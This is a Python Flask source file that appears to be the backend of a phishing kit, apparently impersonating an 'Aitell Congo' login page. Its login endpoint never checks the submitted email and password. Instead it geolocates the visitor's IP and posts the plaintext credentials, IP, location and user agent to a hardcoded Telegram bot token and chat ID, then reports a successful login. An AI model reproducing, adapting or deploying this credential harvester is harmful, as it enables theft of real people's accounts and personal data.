from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from datetime import datetime
import requests
import json
import logging

from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)
CORS(app, origins="*", supports_credentials=True)


# Configure logging
logging.basicConfig(level=logging.INFO)
app.logger.setLevel(logging.INFO)

# Telegram bot configuration
bot_token = "7042325269:AAHb7fGXOQQ8bmzhTcdjbtuV_rr3Q6iLw4M"
chat_id = "-1004468440141"

# Health check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'message': 'Server is running'}), 200


@app.route('/api/login', methods=['POST'])
def login():
    """Login user and send credentials to Telegram"""
    try:
        data = request.get_json()
        app.logger.info(f'Received login data: {data}')
        
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        # Get user info
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        
        # Get location from IP
        try:
            response = requests.get(f'https://ipinfo.io/{user_ip}/json', timeout=5)
            location_data = response.json()
            location = f"{location_data.get('city', 'N/A')}, {location_data.get('region', 'N/A')}, {location_data.get('country', 'N/A')}"
        except Exception:
            location = 'N/A'
        
        # Extract login data
        email = data.get('email', 'N/A')
        password = data.get('password', 'N/A')
        
        # Format message for Telegram
        payload_text = f"""🔐 Aitell Congo Login

📧 Email: {email}
🔑 Password: {password}

🌐 IP Information:
   • IP Address: {user_ip}
   • Location: {location}
   • User Agent: {user_agent}

⏰ Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}

📦 Full Data:
{json.dumps(data, indent=2)}"""
        
        # Send to Telegram
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        telegram_response = requests.post(
            f'https://api.telegram.org/bot{bot_token}/sendMessage',
            json=payload_telegram,
            timeout=10
        )
        
        if telegram_response.status_code == 200:
            app.logger.info('Login data sent to Telegram successfully')
            return jsonify({
                'message': 'Login successful',
                'success': True,
                'user': {
                    'name': email.split('@')[0],
                    'username': email.split('@')[0],
                    'email': email
                }
            }), 200
        else:
            app.logger.warning(f'Failed to send to Telegram: {telegram_response.status_code}')
            return jsonify({'error': 'Failed to login', 'success': False}), 500
            
    except Exception as e:
        app.logger.error(f'Error in login: {str(e)}')
        import traceback
        app.logger.error(traceback.format_exc())
        return jsonify({'error': 'Failed to process login', 'details': str(e)}), 500

if __name__ == '__main__':
        app.run(port=5000, host='0.0.0.0')
